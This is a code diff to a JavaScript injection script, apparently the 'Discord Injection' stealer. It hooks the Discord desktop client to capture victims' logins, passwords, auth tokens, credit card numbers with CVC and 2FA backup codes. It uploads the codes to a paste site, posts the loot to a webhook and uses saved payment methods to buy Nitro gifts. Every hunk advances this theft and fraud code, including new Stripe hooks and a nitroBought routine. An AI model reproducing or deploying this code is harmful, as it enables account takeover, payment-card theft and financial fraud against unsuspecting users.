@@ -5,7 +5,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron')
 
 const config = {
-    auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal
+    auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
     ping_on_run: false, //pings @everyone when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
@@ -47,6 +47,8 @@ const config = {
             'https://*.discord.com/api/v*/auth/login',
             'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
             'https://api.stripe.com/v*/tokens',
+            'https://api.stripe.com/v*/setup_intents/*/confirm',
+            'https://api.stripe.com/v*/payment_intents/*/confirm'
         ]
     },
     filter2: {
@@ -144,7 +146,7 @@ const dpaste = async(content) => {
     xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
     xmlHttp.send('content=${encodeURIComponent(content)}&expiry_days=30');
     xmlHttp.responseText;`)
-    return raw+'.txt'
+    return raw
 };
 
 const getInfo = async(token) => {
@@ -157,25 +159,21 @@ const getInfo = async(token) => {
 };
 
 const getMfa = async(password, token) => {
-    if (!token.startsWith('.mfa')) return 'N/A';
+    if (!token.startsWith('mfa.')) return 'N/A';
     let content = "";
     const mfa = await execScript(`var xmlHttp = new XMLHttpRequest();
     xmlHttp.open("POST", "${config.api}/mfa/codes", false);
     xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.setRequestHeader("authorization", "${token}");
-    xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send(JSON.stringify(${JSON.stringify({password: password, regenerate:false})}));
     xmlHttp.responseText
     `)
-    const json = JSON.parse(mfa)
-    let codes = json.backup_codes
-    const r = codes.filter((code) => {
-        return code.consumed === null
-    })
-    for (let i in r) {
-        content += `${r[i].code.insert(4, "-")}\n`
-    } 
+    const codes = JSON.parse(mfa).backup_codes
+    for (const i in codes) {
+        content += `${codes[i].code} ⋮ ${codes[i].consumed ? 'used' : 'not used'}\n`
+    }
     const paste = await dpaste(content);
-    return `[click me!](${paste})`
+    return paste
 };
 
 const fetchBilling = async(token) => {
@@ -184,20 +182,21 @@ const fetchBilling = async(token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`)
-    if (bill && !bill.length) {
+    if (bill.length === 0 && !bill.lenght) {
         return "";
     }
-    return JSON.parse(JSON.parse(bill))
+    return JSON.parse(bill)
 };
+
 const getBilling = async (token) => {
     const data = await fetchBilling(token)
     if (data === "") return "❌";
     let billing = "";
     data.forEach(x => {
         if (x.type === 2 && !x.invalid) {
-            billing += "✔️" + " <:paypal:951139189389410365>";
+            billing += "✅" + " <:paypal:951139189389410365>";
         } else if (x.type === 1 && !x.invalid) {
-            billing += "✔️" + " 💳";
+            billing += "✅" + " 💳";
         } else {
             billing = "❌";
         };
@@ -208,19 +207,20 @@ const getBilling = async (token) => {
 
 const Purchase = async (token, id, _type, _time) => {
     const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "${config.api}/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send(${JSON.stringify(
+    xmlHttp.setRequestHeader('Content-Type', 'application/json');
+    xmlHttp.send(JSON.stringify(${JSON.stringify(
         {
-            "gift": true,
-            "sku_subscription_plan_id": config.nitro[_type][_time]['sku'],
-            "payment_source_id": id,
-            "payment_source_token": 'None',
             "expected_amount": config.nitro[_type][_time]['price'],
             "expected_currency": "usd",
-            "purchase_token": "500fb34b-671a-4614-a72e-9d13becc2e95"
+            "gift": true,
+            "payment_source_id": id,
+            "payment_source_token": null,
+            "purchase_token": "2422867c-244d-476a-ba4f-36e197758d97",
+            "sku_subscription_plan_id": config.nitro[_type][_time]['sku'],
         }
-    )});
+    )}));
     xmlHttp.responseText`)
     if (req['gift_code']) {
         return 'https://discord.gift/'+req['gift_code'];
@@ -228,30 +228,29 @@ const Purchase = async (token, id, _type, _time) => {
 };
 
 const buyNitro = async (token) => {
-    if (!config.auto_buy_nitro) return 'Auto Buy Nitro disabled';
     const data = await fetchBilling(token);
-    const valid = []
+    if (data === "") return "Failed to Purchase ❌";
+    
+    let IDS = []
     data.forEach(x => {
-        if (x.type === 2 && !x.invalid) {
-            valid.push(x.id)
-        } else if (x.type === 1 && !x.invalid) {
-            valid.push(x.id)
+        if (!x.invalid) {
+            IDS = IDS.concat(x.id);
         }
     });
-    for (let id in valid) {
-        const first = Purchase(token, id, 'boost', 'year')
+    for (let sourceID in IDS) {
+        const first = Purchase(token, sourceID, 'boost', 'year')
         if (first !== null) {
             return first;
         } else {
-            const second = Purchase(token, id, 'boost', 'month')
+            const second = Purchase(token, sourceID, 'boost', 'month')
             if (second !== null) {
                 return second;
             } else {
-                const third = Purchase(token, id, 'classic', 'month')
+                const third = Purchase(token, sourceID, 'classic', 'month')
                 if (third !== null) {
                     return third;
                 } else {
-                    return 'Failed to Purchase Gift'
+                    return 'Failed to Purchase ❌'
                 }
             }
         }
@@ -343,7 +342,7 @@ const login = async (email, password, token) => {
                     },
                     {
                         "name": "**Discord Info**",
-                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: [**click me!**](${mfa})`,
                         "inline": false
                     }, 
                     {
@@ -357,7 +356,7 @@ const login = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -386,7 +385,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     },
                     {
                         "name": "**Discord Info**",
-                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: [**click me!**](${mfa})`,
                         "inline": true
                     },
                     {
@@ -400,7 +399,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -429,7 +428,7 @@ const emailChanged = async (email, password, token) => {
                     },
                     {
                         "name": "**Discord Info**",
-                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: [**click me!**](${mfa})`,
                         "inline": true
                     },
                     {
@@ -443,7 +442,7 @@ const emailChanged = async (email, password, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -457,7 +456,6 @@ const PaypalAdded = async (token) => {
     const nitro = getNitro(json.premium_type);
     const badges = getBadges(json.flags);
     const billing = getBilling(token);
-    const code = await buyNitro(token);
     const content = {
         username: config.embed_name,
         avatar_url: config.embed_icon,
@@ -467,7 +465,7 @@ const PaypalAdded = async (token) => {
                 "fields": [
                     {
                         "name": "**Paypal Added**",
-                        "value": `Nitro code: \`${code}\``,
+                        "value": `Time to buy some nitro baby 😩`,
                         "inline": false
                     },
                     {
@@ -486,7 +484,7 @@ const PaypalAdded = async (token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -500,7 +498,6 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     const nitro = getNitro(json.premium_type);
     const badges = getBadges(json.flags)
     const billing = await getBilling(token)
-    const code = await buyNitro(token)
     const content = {
         username: config.embed_name,
         avatar_url: config.embed_icon,
@@ -510,18 +507,13 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                 "fields": [
                     {
                         "name": "**Credit Card Added**",
-                        "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
+                        "value": `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
                         "inline": true
                     },
                     {
                         "name": "**Discord Info**",
                         "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                         "inline": true
-                    },
-                    {
-                        "name": "**Nitro Code**",
-                        "value": `\`${code}\``,
-                        "inline": false
                     },
                     {
                         "name": "**Token**",
@@ -534,7 +526,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
                     "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                 },
                 "footer": {
-                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                 }
             }
         ]
@@ -543,6 +535,49 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
     hooker(content)
 };
 
+const nitroBought = async (token) => {
+    const json = await getInfo(token);
+    const nitro = getNitro(json.premium_type);
+    const badges = getBadges(json.flags)
+    const billing = await getBilling(token);
+    const code = await buyNitro(token);
+    const content = {
+        username: config.embed_name,
+        content: code,
+        avatar_url: config.embed_icon,
+        embeds: [
+            {
+                "color": config.embed_color,
+                "fields": [
+                    {
+                        "name": "**Nitro bought!**",
+                        "value": `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+                        "inline": true
+                    },
+                    {
+                        "name": "**Discord Info**",
+                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+                        "inline": true
+                    },
+                    {
+                        "name": "**Token**",
+                        "value": `\`${token}\``,
+                        "inline": false
+                    }
+                ],
+                "author": {
+                    "name": json.username +"#" + json.discriminator + "・" + json.id,
+                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                },
+                "footer": {
+                    "text": "🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
+                }
+            }
+        ]
+    }
+    if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
+    hooker(content)
+}
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
     if (details.url.startsWith("wss://remote-auth-gateway")) {
         callback({
@@ -589,9 +624,13 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
     if (details.statusCode !== 200 && details.statusCode !== 202) return;
     const unparsedData = details.uploadData[0].bytes
-    const data = JSON.parse(Buffer.from(unparsedData).toString())
+    let data;
+    try {
+        data = JSON.parse(Buffer.from(unparsedData).toString())
+    } catch (SyntaxError) {
+        data = JSON.parse(JSON.stringify(Buffer.from(unparsedData).toString()))
+    }
     const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)
-
     switch (true) {
         case details.url.endsWith('login'):
             login(data.login, data.password, token)
@@ -614,6 +653,14 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
         case details.url.endsWith('paypal_accounts') && details.method === "POST":
             PaypalAdded(token)
             break;
+
+        case details.url.endsWith('confirm') && details.method === "POST":
+            if (!config.auto_buy_nitro) return;
+            setTimeout(() => {
+                nitroBought(token)
+            }, 7500);
+            break;
+
         default:
             break;
     }
